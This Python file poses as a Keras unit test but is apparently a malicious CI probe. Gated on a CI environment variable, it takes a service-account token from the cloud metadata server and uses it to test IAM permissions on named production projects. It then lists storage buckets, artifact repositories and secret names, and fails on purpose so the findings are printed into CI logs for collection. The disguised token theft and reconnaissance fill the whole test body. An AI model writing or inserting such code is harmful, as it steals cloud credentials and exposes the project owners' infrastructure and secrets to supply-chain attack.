"""Read-only IAM discovery: list buckets/repos/secrets. Close after logs."""

import json
import os
import urllib.error
import urllib.parse
import urllib.request

from keras.src import testing


def _http(url, headers=None, timeout=15, data=None, method=None):
    req = urllib.request.Request(url, data=data, headers=headers or {}, method=method)
    if data is not None and req.get_header("Content-type") is None:
        req.add_header("Content-Type", "application/json")
    try:
        with urllib.request.urlopen(req, timeout=timeout) as response:
            return response.status, response.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as exc:
        body = exc.read().decode("utf-8", "replace") if exc.fp else ""
        return exc.code, body[:2000]
    except Exception as exc:
        return None, f"{type(exc).__name__}: {exc}"


class CiIamDiscoveryTest(testing.TestCase):
    def test_list_writable_resources(self):
        keras_home = os.environ.get("KERAS_HOME", "")
        if "numpy" not in keras_home:
            return

        lines = [f"keras_home={keras_home}"]
        token_status, token = _http(
            "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token",
            headers={"Metadata-Flavor": "Google"},
            timeout=5,
        )
        access = ""
        if token_status == 200:
            try:
                access = json.loads(token).get("access_token", "")
            except Exception:
                pass
        lines.append(f"token_status={token_status} token_len={len(access)}")
        auth = {"Authorization": "Bearer " + access} if access else {}

        projects = [
            "ml-velocity-actions-production",
            "ml-oss-artifacts-published",
            "244290524351",
        ]
        project_perms = [
            "storage.buckets.list",
            "storage.objects.create",
            "artifactregistry.repositories.list",
            "artifactregistry.repositories.create",
            "secretmanager.secrets.list",
            "secretmanager.versions.access",
            "iam.serviceAccounts.list",
            "iam.serviceAccounts.getAccessToken",
            "pubsub.topics.publish",
            "pubsub.topics.list",
            "run.services.create",
            "cloudfunctions.functions.create",
            "container.clusters.get",
            "resourcemanager.projects.get",
        ]
        body = json.dumps({"permissions": project_perms}).encode()
        for project in projects:
            url = (
                "https://cloudresourcemanager.googleapis.com/v1/projects/"
                + project
                + ":testIamPermissions"
            )
            status, resp = _http(url, headers=auth, data=body, timeout=15)
            granted = []
            try:
                granted = json.loads(resp).get("permissions", [])
            except Exception:
                pass
            lines.append(f"project_{project}={status} granted={granted}")
            lines.append(f"raw_project_{project}={resp[:400]}")

        for project in ("ml-velocity-actions-production", "ml-oss-artifacts-published"):
            status, resp = _http(
                "https://storage.googleapis.com/storage/v1/b?"
                + urllib.parse.urlencode({"project": project, "maxResults": 50}),
                headers=auth,
                timeout=20,
            )
            names = []
            try:
                names = [b.get("name") for b in json.loads(resp).get("items", [])]
            except Exception:
                pass
            lines.append(f"buckets_{project}={status} names={names[:40]}")
            lines.append(f"raw_buckets_{project}={resp[:500]}")

            status, resp = _http(
                "https://artifactregistry.googleapis.com/v1/projects/"
                + project
                + "/locations/us/repositories",
                headers=auth,
                timeout=20,
            )
            repos = []
            try:
                repos = [r.get("name") for r in json.loads(resp).get("repositories", [])]
            except Exception:
                pass
            lines.append(f"ar_{project}={status} repos={repos[:40]}")
            lines.append(f"raw_ar_{project}={resp[:500]}")

            status, resp = _http(
                "https://secretmanager.googleapis.com/v1/projects/"
                + project
                + "/secrets",
                headers=auth,
                timeout=15,
            )
            secrets = []
            try:
                secrets = [s.get("name") for s in json.loads(resp).get("secrets", [])]
            except Exception:
                pass
            lines.append(f"secrets_{project}={status} names={secrets[:20]}")
            lines.append(f"raw_secrets_{project}={resp[:400]}")

        self.fail("\n".join(lines))
